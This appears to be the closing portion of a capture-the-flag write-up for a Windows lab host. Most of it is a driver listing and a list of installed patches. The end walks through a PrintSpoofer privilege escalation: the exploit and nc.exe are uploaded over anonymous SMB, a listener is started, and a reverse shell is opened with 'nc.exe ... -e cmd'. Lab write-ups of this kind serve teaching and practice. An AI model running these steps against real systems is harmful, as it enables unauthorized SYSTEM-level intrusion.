1394ohci     1394 OHCI Compliant Ho Kernel        7/15/2016 7:21:36 PM  
3ware        3ware                  Kernel        5/18/2015 3:28:03 PM  
ACPI         Microsoft ACPI Driver  Kernel        7/15/2016 7:10:47 PM  
AcpiDev      ACPI Devices driver    Kernel        7/15/2016 7:29:10 PM  
acpiex       Microsoft ACPIEx Drive Kernel        7/15/2016 7:28:23 PM  
acpipagr     ACPI Processor Aggrega Kernel        7/15/2016 7:29:00 PM  
AcpiPmi      ACPI Power Meter Drive Kernel        7/15/2016 7:19:44 PM  
acpitime     ACPI Wake Alarm Driver Kernel        7/15/2016 7:29:20 PM  
ADP80XX      ADP80XX                Kernel        4/9/2015 1:49:48 PM   
AFD          Ancillary Function Dri Kernel        10/14/2016 8:53:45 PM 
ahcache      Application Compatibil Kernel        10/14/2016 8:31:36 PM 
AmdK8        AMD K8 Processor Drive Kernel        7/15/2016 7:10:42 PM  
AmdPPM       AMD Processor Driver   Kernel        7/15/2016 7:10:41 PM  
amdsata      amdsata                Kernel        5/14/2015 5:14:52 AM  
amdsbs       amdsbs                 Kernel        12/11/2012 1:21:44 PM 
amdxata      amdxata                Kernel        4/30/2015 5:55:35 PM  
AppID        AppID Driver           Kernel        7/15/2016 7:27:05 PM  
applockerflt Smartlocker Filter Dri Kernel        7/15/2016 7:27:27 PM  
AppvStrm     AppvStrm               File System   9/15/2016 9:15:25 AM  
AppvVemgr    AppvVemgr              File System   7/15/2016 7:10:56 PM  
AppvVfs      AppvVfs                File System   7/15/2016 7:10:53 PM  
arcsas       Adaptec SAS/SATA-II RA Kernel        4/9/2015 12:12:07 PM  
AsyncMac     RAS Asynchronous Media Kernel        7/15/2016 7:29:00 PM  
atapi        IDE Channel            Kernel        7/15/2016 7:29:05 PM  
AWSNVMe      AWSNVMe                Kernel        9/14/2010 7:35:18 PM  
b06bdrv      QLogic Network Adapter Kernel        5/25/2016 12:03:08 AM 
BasicDisplay BasicDisplay           Kernel        7/15/2016 7:28:02 PM  
BasicRender  BasicRender            Kernel        7/15/2016 7:28:14 PM  
bcmfn        bcmfn Service          Kernel        6/8/2015 1:32:02 AM   
bcmfn2       bcmfn2 Service         Kernel        3/16/2014 3:07:36 AM  
Beep         Beep                   Kernel        7/15/2016 7:22:02 PM  
bfadfcoei    bfadfcoei              Kernel        4/14/2015 4:01:58 PM  
bfadi        bfadi                  Kernel        4/10/2015 3:23:08 PM  
bowser       Browser Support Driver File System   11/2/2016 3:23:23 AM  
buttonconver Service for Portable D Kernel        7/15/2016 7:29:14 PM  
bxfcoe       QLogic FCoE Offload dr Kernel        4/14/2016 5:32:16 PM  
bxois        QLogic Offload iSCSI D Kernel        4/15/2016 9:17:19 AM  
CapImg       HID driver for CapImg  Kernel        9/10/2016 6:21:43 AM  
cdfs         CD/DVD File System Rea File System   7/15/2016 7:10:38 PM  
cdrom        CD-ROM Driver          Kernel        7/15/2016 7:10:42 PM  
cht4iscsi    cht4iscsi              Kernel        4/20/2016 2:54:30 AM  
cht4vbd      Chelsio Virtual Bus Dr Kernel        4/15/2016 12:32:54 AM 
CLFS         Common Log (CLFS)      Kernel        12/9/2016 1:18:07 AM  
clreg        Virtual Registry for C Kernel        7/15/2016 7:27:04 PM  
CmBatt       Microsoft ACPI Control Kernel        7/15/2016 7:28:28 PM  
CNG          CNG                    Kernel        12/20/2016 11:05:04 PM
cnghwassist  CNG Hardware Assist al Kernel        7/15/2016 7:27:44 PM  
CompositeBus Composite Bus Enumerat Kernel        7/15/2016 7:20:11 PM  
condrv       Console Driver         Kernel        7/15/2016 7:10:38 PM  
CSC          Offline Files Driver   Kernel        7/15/2016 7:22:28 PM  
dam          Desktop Activity Moder Kernel        10/14/2016 8:43:13 PM 
Dfsc         DFS Namespace Client D File System   10/5/2016 2:34:11 AM  
Disk         Disk Driver            Kernel        7/15/2016 7:10:52 PM  
dmvsc        dmvsc                  Kernel        7/15/2016 7:27:00 PM  
drmkaud      Microsoft Trusted Audi Kernel        7/15/2016 7:28:35 PM  
DXGKrnl      LDDM Graphics Subsyste Kernel        12/9/2016 1:21:04 AM  
E1G60        Intel(R) PRO/1000 NDIS Kernel        3/23/2010 2:08:16 PM  
ebdrv        QLogic 10 Gigabit Ethe Kernel        5/25/2016 12:01:05 AM 
EhStorClass  Enhanced Storage Filte Kernel        7/15/2016 7:18:35 PM  
EhStorTcgDrv Microsoft driver for s Kernel        9/6/2016 9:46:37 PM   
elxfcoe      elxfcoe                Kernel        1/26/2016 3:52:14 PM  
elxstor      elxstor                Kernel        1/26/2016 3:45:13 PM  
ErrDev       Microsoft Hardware Err Kernel        7/15/2016 7:19:40 PM  
exfat        exFAT File System Driv File System   7/15/2016 7:20:44 PM  
fastfat      FAT12/16/32 File Syste File System   11/11/2016 1:12:53 AM 
fcvsc        fcvsc                  Kernel        7/15/2016 7:29:15 PM  
fdc          Floppy Disk Controller Kernel        7/15/2016 7:22:03 PM  
FileCrypt    FileCrypt              File System   7/15/2016 7:22:39 PM  
FileInfo     File Information FS Mi File System   7/15/2016 7:26:05 PM  
Filetrace    Filetrace              File System   7/15/2016 7:19:50 PM  
flpydisk     Floppy Disk Driver     Kernel        7/15/2016 7:19:19 PM  
FltMgr       FltMgr                 File System   7/15/2016 7:10:45 PM  
FsDepends    File System Dependency File System   7/15/2016 7:27:27 PM  
gencounter   Microsoft Hyper-V Gene Kernel        7/15/2016 7:28:26 PM  
genericusbfn Generic USB Function C Kernel        7/15/2016 7:29:03 PM  
GPIOClx0101  Microsoft GPIO Class E Kernel        7/15/2016 7:25:17 PM  
GpuEnergyDrv GPU Energy Driver      Kernel        7/15/2016 7:28:09 PM  
HdAudAddServ Microsoft 1.1 UAA Func Kernel        7/15/2016 7:24:20 PM  
HDAudBus     Microsoft UAA Bus Driv Kernel        7/15/2016 7:27:11 PM  
HidBatt      HID UPS Battery Driver Kernel        7/15/2016 7:20:30 PM  
HidBth       Microsoft Bluetooth HI Kernel        7/15/2016 7:26:42 PM  
hidinterrupt Common Driver for HID  Kernel        7/15/2016 7:29:21 PM  
HidUsb       Microsoft HID Class Dr Kernel        8/5/2016 8:47:49 PM   
HpSAMD       HpSAMD                 Kernel        3/26/2013 2:36:54 PM  
HTTP         HTTP Service           Kernel        10/14/2016 8:41:03 PM 
hvservice    Hypervisor/Virtual Mac Kernel        8/5/2016 8:43:48 PM   
hwpolicy     Hardware Policy Driver Kernel        7/15/2016 7:10:41 PM  
hyperkbd     hyperkbd               Kernel        7/15/2016 7:28:49 PM  
i8042prt     i8042 Keyboard and PS/ Kernel        7/15/2016 7:26:25 PM  
iaLPSSi_GPIO Intel(R) Serial IO GPI Kernel        2/2/2015 1:00:09 AM   
iaLPSSi_I2C  Intel(R) Serial IO I2C Kernel        2/24/2015 7:52:07 AM  
iaStorAV     Intel(R) SATA RAID Con Kernel        2/19/2015 4:08:39 AM  
iaStorV      Intel RAID Controller  Kernel        4/11/2011 11:48:16 AM 
ibbus        Mellanox InfiniBand Bu Kernel        4/10/2016 6:46:21 AM  
IndirectKmd  Indirect Displays Kern Kernel        7/15/2016 7:27:35 PM  
intelide     intelide               Kernel        7/15/2016 7:29:13 PM  
intelpep     Intel(R) Power Engine  Kernel        7/15/2016 7:18:27 PM  
intelppm     Intel Processor Driver Kernel        7/15/2016 7:10:43 PM  
IpFilterDriv IP Traffic Filter Driv Kernel        7/15/2016 7:27:24 PM  
IPMIDRV      IPMIDRV                Kernel        7/15/2016 7:23:25 PM  
IPNAT        IP Network Address Tra Kernel        7/15/2016 7:26:37 PM  
IPsecGW      Windows IPsec Gateway  Kernel        7/15/2016 7:26:51 PM  
isapnp       isapnp                 Kernel        7/15/2016 7:27:57 PM  
iScsiPrt     iScsiPort Driver       Kernel        7/15/2016 7:19:27 PM  
kbdclass     Keyboard Class Driver  Kernel        7/15/2016 7:26:27 PM  
kbdhid       Keyboard HID Driver    Kernel        9/15/2016 9:43:23 AM  
kdnic        Microsoft Kernel Debug Kernel        7/15/2016 7:28:28 PM  
KSecDD       KSecDD                 Kernel        9/6/2016 10:00:34 PM  
KSecPkg      KSecPkg                Kernel        8/5/2016 8:44:30 PM   
ksthunk      Kernel Streaming Thunk Kernel        7/15/2016 7:28:56 PM  
lltdio       Link-Layer Topology Di Kernel        7/15/2016 7:27:11 PM  
LSI_SAS      LSI_SAS                Kernel        3/25/2015 12:36:48 PM 
LSI_SAS2i    LSI_SAS2i              Kernel        3/28/2016 11:49:34 AM 
LSI_SAS3i    LSI_SAS3i              Kernel        3/28/2016 11:49:51 AM 
LSI_SSS      LSI_SSS                Kernel        3/15/2013 4:39:38 PM  
luafv        UAC File Virtualizatio File System   7/15/2016 7:21:48 PM  
megasas      megasas                Kernel        3/4/2015 6:36:29 PM   
megasas2i    megasas2i              Kernel        7/22/2016 2:36:46 PM  
megasr       megasr                 Kernel        6/3/2013 3:02:39 PM   
mlx4_bus     Mellanox ConnectX Bus  Kernel        4/10/2016 6:49:39 AM  
MMCSS        Multimedia Class Sched Kernel        7/15/2016 7:20:45 PM  
Modem        Modem                  Kernel        11/11/2016 1:26:20 AM 
monitor      Microsoft Monitor Clas Kernel        7/15/2016 7:28:26 PM  
mouclass     Mouse Class Driver     Kernel        7/15/2016 7:26:40 PM  
mouhid       Mouse HID Driver       Kernel        7/15/2016 7:27:35 PM  
mountmgr     Mount Point Manager    Kernel        7/15/2016 7:10:42 PM  
mpsdrv       Windows Firewall Autho Kernel        7/15/2016 7:27:16 PM  
mrxsmb       SMB MiniRedirector Wra File System   9/6/2016 9:48:56 PM   
mrxsmb10     SMB 1.x MiniRedirector File System   11/11/2016 1:15:06 AM 
mrxsmb20     SMB 2.0 MiniRedirector File System   11/11/2016 1:15:06 AM 
MsBridge     Microsoft MAC Bridge   Kernel        7/15/2016 7:27:28 PM  
Msfs         Msfs                   File System   7/15/2016 7:10:38 PM  
msgpiowin32  Common Driver for Butt Kernel        7/15/2016 7:19:13 PM  
mshidkmdf    Pass-through HID to KM Kernel        7/15/2016 7:27:13 PM  
mshidumdf    Pass-through HID to UM Kernel        7/15/2016 7:26:59 PM  
msisadrv     msisadrv               Kernel        7/15/2016 7:28:51 PM  
MSKSSRV      Microsoft Streaming Se Kernel        7/15/2016 7:29:07 PM  
MsLbfoProvid Microsoft Load Balanci Kernel        7/15/2016 7:26:46 PM  
MSPCLOCK     Microsoft Streaming Cl Kernel        7/15/2016 7:29:26 PM  
MSPQM        Microsoft Streaming Qu Kernel        7/15/2016 7:29:04 PM  
MsRPC        MsRPC                  Kernel        7/15/2016 7:23:06 PM  
mssmbios     Microsoft System Manag Kernel        7/15/2016 7:26:00 PM  
MSTEE        Microsoft Streaming Te Kernel        7/15/2016 7:29:28 PM  
MTConfig     Microsoft Input Config Kernel        7/15/2016 7:21:42 PM  
Mup          Mup                    File System   7/15/2016 7:11:22 PM  
mvumis       mvumis                 Kernel        5/23/2014 1:39:04 PM  
ndfltr       NetworkDirect Service  Kernel        4/10/2016 6:46:09 AM  
NDIS         NDIS System Driver     Kernel        10/5/2016 2:19:09 AM  
NdisCap      Microsoft NDIS Capture Kernel        7/15/2016 7:27:14 PM  
NdisImPlatfo Microsoft Network Adap Kernel        7/15/2016 7:27:11 PM  
NdisTapi     Remote Access NDIS TAP Kernel        7/15/2016 7:28:48 PM  
Ndisuio      NDIS Usermode I/O Prot Kernel        7/15/2016 7:26:32 PM  
NdisVirtualB Microsoft Virtual Netw Kernel        7/15/2016 7:26:32 PM  
NdisWan      Remote Access NDIS WAN Kernel        7/15/2016 7:25:29 PM  
ndiswanlegac Remote Access LEGACY N Kernel        7/15/2016 7:25:29 PM  
ndproxy      @%SystemRoot%\system32 Kernel        7/15/2016 7:28:38 PM  
NetBIOS      NetBIOS Interface      File System   7/15/2016 7:27:18 PM  
NetBT        NetBT                  Kernel        7/15/2016 7:25:07 PM  
Npfs         Npfs                   File System   7/15/2016 7:10:38 PM  
npsvctrig    Named pipe service tri Kernel        7/15/2016 7:28:33 PM  
nsiproxy     NSI Proxy Service Driv Kernel        7/15/2016 7:26:45 PM  
NTFS         NTFS                   File System   11/2/2016 3:15:32 AM  
Null         Null                   Kernel        7/15/2016 7:10:37 PM  
nvraid       nvraid                 Kernel        4/21/2014 11:28:42 AM 
nvstor       nvstor                 Kernel        4/21/2014 11:34:03 AM 
Parport      Parallel port driver   Kernel        7/15/2016 7:26:54 PM  
partmgr      Partition driver       Kernel        11/11/2016 12:59:07 AM
pci          PCI Bus Driver         Kernel        12/13/2016 8:36:59 PM 
pciide       pciide                 Kernel        7/15/2016 7:29:21 PM  
pcmcia       pcmcia                 Kernel        7/15/2016 7:19:51 PM  
pcw          Performance Counters f Kernel        7/15/2016 7:10:37 PM  
pdc          pdc                    Kernel        8/19/2016 9:51:30 PM  
PEAUTH       PEAUTH                 Kernel        7/15/2016 7:24:39 PM  
percsas2i    percsas2i              Kernel        3/14/2016 5:50:11 PM  
percsas3i    percsas3i              Kernel        3/4/2016 1:22:10 PM   
PptpMiniport WAN Miniport (PPTP)    Kernel        7/15/2016 7:28:13 PM  
Processor    Processor Driver       Kernel        7/15/2016 7:10:42 PM  
Psched       QoS Packet Scheduler   Kernel        7/15/2016 7:25:21 PM  
ql2300i      QLogic Fibre Channel S Kernel        8/16/2015 9:20:31 PM  
ql40xx2i     QLogic iSCSI Miniport  Kernel        3/25/2013 3:43:47 PM  
qlfcoei      QLogic [FCoE] STOR Min Kernel        6/7/2013 12:07:04 PM  
RasAcd       Remote Access Auto Con Kernel        7/15/2016 7:29:11 PM  
RasAgileVpn  WAN Miniport (IKEv2)   Kernel        7/15/2016 7:27:00 PM  
RasGre       WAN Miniport (GRE)     Kernel        7/15/2016 7:29:00 PM  
Rasl2tp      WAN Miniport (L2TP)    Kernel        7/15/2016 7:27:35 PM  
RasPppoe     Remote Access PPPOE Dr Kernel        7/15/2016 7:28:21 PM  
RasSstp      WAN Miniport (SSTP)    Kernel        7/15/2016 7:27:11 PM  
rdbss        Redirected Buffering S File System   11/11/2016 1:08:35 AM 
rdpbus       Remote Desktop Device  Kernel        7/15/2016 7:11:15 PM  
RDPDR        Remote Desktop Device  Kernel        7/15/2016 7:11:18 PM  
RdpVideoMini Remote Desktop Video M Kernel        7/15/2016 7:11:10 PM  
ReFS         ReFS                   File System   11/11/2016 12:59:23 AM
ReFSv1       ReFSv1                 File System   7/15/2016 7:10:46 PM  
rspndr       Link-Layer Topology Di Kernel        7/15/2016 7:27:29 PM  
s3cap        s3cap                  Kernel        7/15/2016 7:29:15 PM  
sacdrv       sacdrv                 Kernel        9/15/2016 9:42:15 AM  
sbp2port     SBP-2 Transport/Protoc Kernel        7/15/2016 7:10:38 PM  
scfilter     Smart card PnP Class F Kernel        7/15/2016 7:27:15 PM  
scmbus       Microsoft Storage Clas Kernel        7/15/2016 7:27:23 PM  
scmdisk0101  Microsoft NVDIMM-N dis Kernel        7/15/2016 7:28:01 PM  
sdbus        sdbus                  Kernel        10/5/2016 2:24:34 AM  
sdstor       SD Storage Port Driver Kernel        7/15/2016 7:22:26 PM  
SerCx        Serial UART Support Li Kernel        7/15/2016 7:26:18 PM  
SerCx2       Serial UART Support Li Kernel        7/15/2016 7:27:10 PM  
Serenum      Serenum Filter Driver  Kernel        7/15/2016 7:29:05 PM  
Serial       Serial port driver     Kernel        7/15/2016 7:28:29 PM  
sermouse     Serial Mouse Driver    Kernel        7/15/2016 7:28:00 PM  
sfloppy      High-Capacity Floppy D Kernel        7/15/2016 7:17:13 PM  
SiSRaid2     SiSRaid2               Kernel        9/24/2008 11:28:20 AM 
SiSRaid4     SiSRaid4               Kernel        10/1/2008 2:56:04 PM  
smbdirect    smbdirect              File System   9/15/2016 9:28:41 AM  
spaceport    Storage Spaces Driver  Kernel        10/14/2016 8:46:37 PM 
SpbCx        Simple Peripheral Bus  Kernel        7/15/2016 7:25:02 PM  
srv          Server SMB 1.xxx Drive File System   9/6/2016 9:49:09 PM   
srv2         Server SMB 2.xxx Drive File System   11/11/2016 1:14:33 AM 
srvnet       srvnet                 File System   9/6/2016 9:45:09 PM   
stexstor     stexstor               Kernel        11/26/2012 4:02:51 PM 
storahci     Microsoft Standard SAT Kernel        9/15/2016 9:24:36 AM  
storflt      Microsoft Hyper-V Stor Kernel        7/15/2016 7:27:59 PM  
stornvme     Microsoft Standard NVM Kernel        9/15/2016 9:24:55 AM  
storqosflt   Storage QoS Filter Dri File System   7/15/2016 7:26:43 PM  
storufs      Microsoft Universal Fl Kernel        7/15/2016 7:19:08 PM  
storvsc      storvsc                Kernel        7/15/2016 7:28:30 PM  
swenum       Software Bus Driver    Kernel        7/15/2016 7:28:55 PM  
Synth3dVsc   Synth3dVsc             Kernel        7/15/2016 7:27:16 PM  
Tcpip        TCP/IP Protocol Driver Kernel        10/14/2016 8:32:46 PM 
Tcpip6       @todo.dll,-100;Microso Kernel        10/14/2016 8:32:46 PM 
tcpipreg     TCP/IP Registry Compat Kernel        7/15/2016 7:25:32 PM  
tdx          NetIO Legacy TDI Suppo Kernel        7/15/2016 7:27:16 PM  
terminpt     Microsoft Remote Deskt Kernel        7/15/2016 7:11:11 PM  
TPM          TPM                    Kernel        11/11/2016 1:23:07 AM 
TsUsbFlt     TsUsbFlt               Kernel        7/15/2016 7:11:21 PM  
TsUsbGD      Remote Desktop Generic Kernel        7/15/2016 7:11:14 PM  
tsusbhub     Remote Desktop USB Hub Kernel        7/15/2016 7:11:22 PM  
tunnel       Microsoft Tunnel Minip Kernel        7/15/2016 7:26:20 PM  
UASPStor     USB Attached SCSI (UAS Kernel        7/15/2016 7:18:15 PM  
UcmCx0101    USB Connector Manager  Kernel        7/15/2016 7:29:03 PM  
UcmTcpciCx01 UCM-TCPCI KMDF Class E Kernel        7/15/2016 7:28:38 PM  
UcmUcsi      USB Connector Manager  Kernel        7/15/2016 7:28:31 PM  
Ucx01000     USB Host Support Libra Kernel        7/15/2016 7:25:10 PM  
UdeCx        USB Device Emulation S Kernel        7/15/2016 7:28:48 PM  
udfs         udfs                   File System   7/15/2016 7:18:00 PM  
UEFI         Microsoft UEFI Driver  Kernel        7/15/2016 7:10:37 PM  
UevAgentDriv UevAgentDriver         File System   7/15/2016 7:30:36 PM  
Ufx01000     USB Function Class Ext Kernel        7/15/2016 7:27:04 PM  
UfxChipidea  USB Chipidea Controlle Kernel        7/15/2016 7:28:15 PM  
ufxsynopsys  USB Synopsys Controlle Kernel        7/15/2016 7:28:15 PM  
umbus        UMBus Enumerator Drive Kernel        7/15/2016 7:22:33 PM  
UmPass       Microsoft UMPass Drive Kernel        7/15/2016 7:29:07 PM  
UrsChipidea  Chipidea USB Role-Swit Kernel        7/15/2016 7:28:59 PM  
UrsCx01000   USB Role-Switch Suppor Kernel        7/15/2016 7:28:56 PM  
UrsSynopsys  Synopsys USB Role-Swit Kernel        7/15/2016 7:29:25 PM  
usbccgp      Microsoft USB Generic  Kernel        7/15/2016 7:28:03 PM  
usbehci      Microsoft USB 2.0 Enha Kernel        7/15/2016 7:23:07 PM  
usbhub       Microsoft USB Standard Kernel        7/15/2016 7:18:19 PM  
USBHUB3      SuperSpeed Hub         Kernel        7/15/2016 7:18:54 PM  
usbohci      Microsoft USB Open Hos Kernel        7/15/2016 7:29:09 PM  
usbprint     Microsoft USB PRINTER  Kernel        7/15/2016 7:29:05 PM  
usbser       Microsoft USB Serial D Kernel        7/15/2016 7:28:49 PM  
USBSTOR      USB Mass Storage Drive Kernel        7/15/2016 7:18:41 PM  
usbuhci      Microsoft USB Universa Kernel        7/15/2016 7:28:50 PM  
USBXHCI      USB xHCI Compliant Hos Kernel        7/15/2016 7:20:30 PM  
VBoxGuest    VirtualBox Guest Drive Kernel        10/10/2019 11:48:10 AM
VBoxMouse    VirtualBox Guest Mouse Kernel        10/10/2019 11:48:02 AM
VBoxSF       VirtualBox Shared Fold File System   10/10/2019 11:48:02 AM
VBoxWddm     VBoxWddm               Kernel        10/10/2019 11:48:02 AM
vdrvroot     Microsoft Virtual Driv Kernel        7/15/2016 7:25:58 PM  
VerifierExt  VerifierExt            Kernel        7/15/2016 7:10:42 PM  
vhdmp        vhdmp                  Kernel        12/13/2016 8:38:15 PM 
vhf          Virtual HID Framework  Kernel        7/15/2016 7:27:49 PM  
vmbus        Virtual Machine Bus    Kernel        7/15/2016 7:26:13 PM  
VMBusHID     VMBusHID               Kernel        7/15/2016 7:28:43 PM  
vmgid        Microsoft Hyper-V Gues Kernel        7/15/2016 7:30:32 PM  
volmgr       Volume Manager Driver  Kernel        7/15/2016 7:10:43 PM  
volmgrx      Dynamic Volume Manager Kernel        7/15/2016 7:10:45 PM  
volsnap      Volume Shadow Copy dri Kernel        7/15/2016 7:10:44 PM  
volume       Volume driver          Kernel        7/15/2016 7:10:37 PM  
vpci         Microsoft Hyper-V Virt Kernel        9/15/2016 9:43:38 AM  
vsmraid      vsmraid                Kernel        4/22/2014 12:21:41 PM 
VSTXRAID     VIA StorX Storage RAID Kernel        1/21/2013 11:00:28 AM 
WacomPen     Wacom Serial Pen HID D Kernel        7/15/2016 7:19:26 PM  
wanarp       Remote Access IP ARP D Kernel        7/15/2016 7:28:56 PM  
wanarpv6     Remote Access IPv6 ARP Kernel        7/15/2016 7:28:56 PM  
wcifs        Windows Container Isol File System   9/15/2016 9:42:03 AM  
wcnfs        Windows Container Name File System   7/15/2016 7:28:27 PM  
WdBoot       Windows Defender Boot  Kernel        7/15/2016 7:28:51 PM  
Wdf01000     Kernel Mode Driver Fra Kernel        7/15/2016 7:13:12 PM  
WdFilter     Windows Defender Mini- File System   7/15/2016 7:25:21 PM  
WdNisDrv     Windows Defender Netwo Kernel        7/15/2016 7:25:56 PM  
WFPLWFS      Microsoft Windows Filt Kernel        7/15/2016 7:25:57 PM  
WIMMount     WIMMount               File System   7/15/2016 7:24:25 PM  
WindowsTrust Windows Trusted Execut Kernel        7/15/2016 7:27:05 PM  
WindowsTrust Microsoft Windows Trus Kernel        7/15/2016 7:27:05 PM  
WinMad       WinMad Service         Kernel        4/10/2016 6:46:08 AM  
WinNat       Windows NAT Driver     Kernel        7/15/2016 7:26:53 PM  
WINUSB       WinUsb Driver          Kernel        7/15/2016 7:28:32 PM  
WinVerbs     WinVerbs Service       Kernel        4/10/2016 6:46:10 AM  
WmiAcpi      Microsoft Windows Mana Kernel        7/15/2016 7:18:19 PM  
Wof          Windows Overlay File S File System   8/5/2016 8:45:24 PM   
WpdUpFltr    WPD Upper Class Filter Kernel        7/15/2016 7:27:41 PM  
ws2ifsl      Winsock IFS Driver     Kernel        7/15/2016 7:27:26 PM  
WudfPf       User Mode Driver Frame Kernel        7/15/2016 7:26:10 PM  
WUDFRd       WUDFRd                 Kernel        7/15/2016 7:25:31 PM  
xboxgip      Xbox Game Input Protoc Kernel        11/11/2016 1:26:51 AM 
xenbus       AWS PV Bus             Kernel        4/18/2019 2:27:54 PM  
xenfilt      AWS Bus Filter         Kernel        4/18/2019 2:27:58 PM  
xeniface     AWS Interface          Kernel        11/26/2018 5:14:06 PM 
xennet       AWS PV Network Device  Kernel        11/19/2018 2:01:56 PM 
xenvbd       AWS PV Storage Host Ad Kernel        5/10/2019 12:23:56 PM 
xenvif       AWS PV Network Class   Kernel        6/24/2019 10:48:29 AM 
xinputhid    XINPUT HID Filter Driv Kernel        8/19/2016 10:20:50 PM 
MpKslDrv     MpKslDrv               Kernel        9/9/1997 1:29:28 PM
```

### Installed Security Patches

```cmd
$ wmic qfe get Caption,Description,HotFixID,InstalledOn

Caption                                     Description      HotFixID   InstalledOn  
http://support.microsoft.com/?kbid=3192137  Update           KB3192137  9/12/2016    
http://support.microsoft.com/?kbid=3211320  Update           KB3211320  1/7/2017 
http://support.microsoft.com/?kbid=3213986  Security Update  KB3213986  1/7/2017 
```

# Privilege Escalation

According to [HackTricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens), there are several exploits that can be used when the current user has the `SeImpersonatePrivilege` privilege: [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM), [SweetPotato](https://github.com/CCob/SweetPotato), and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). RogueWinRM requires WinRM to be disabled, which it is according to the output of  `netstat`. The Potato attacks require DCOM to be enabled. Check if it is.

## Checking if DCOM is Enabled

```cmd
reg query HKLM\Software\Microsoft\OLE /v EnableDCOM
```

![](images/Pasted%20image%2020210809102028.png)

DCOM is disabled, so neither Potato attack will work. This leaves [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

## Exploit Retrieval & Upload

The target machine is 64-bit, so use the 64-bit exploit.

```bash
$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

Resolving github.com (github.com)... 140.82.112.3
Connecting to github.com (github.com)|140.82.112.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github-releases.githubusercontent.com/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210809%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210809T141634Z&X-Amz-Expires=300&X-Amz-Signature=0d11a276eda69bbfafd8231a294c155514ba220b21c53e398e2421295a298e09&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=259576481&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream [following]
--2021-08-09 09:16:32--  https://github-releases.githubusercontent.com/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210809%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210809T141634Z&X-Amz-Expires=300&X-Amz-Signature=0d11a276eda69bbfafd8231a294c155514ba220b21c53e398e2421295a298e09&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=259576481&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream
Resolving github-releases.githubusercontent.com (github-releases.githubusercontent.com)... 185.199.111.154, 185.199.110.154, 185.199.108.154, ...
Connecting to github-releases.githubusercontent.com (github-releases.githubusercontent.com)|185.199.111.154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer64.exe’

PrintSpoofer64.exe                            100%[==============================================================================================>]  26.50K  --.-KB/s    in 0.005s  

2021-08-09 09:16:32 (5.34 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]
```

```bash
$ cp PrintSpoofer64.exe tgihf64.exe

$ smbclient -U anonymous //10.10.38.226/nt4wrksv

Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> put tgihf64.exe
```

## Payload Upload

```bash
$ cp /usr/share/windows-resources/binaries/nc.exe .
$ smbclient -U anonymous //10.10.38.226/nt4wrksv

Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> put nc.exe
```

## Listener

```bash
$ sudo nc -nlvp 443

listening on [any] 443 ...
```

## Payload Execution & Root Flag

```cmd
$ C:\inetpub\wwwroot\nt4wrksv\tgihf64.exe -c "C:\inetpub\wwwroot\nt4wrksv\nc.exe 10.6.31.77 443 -e cmd"
```

![](images/Pasted%20image%2020210809101903.png)
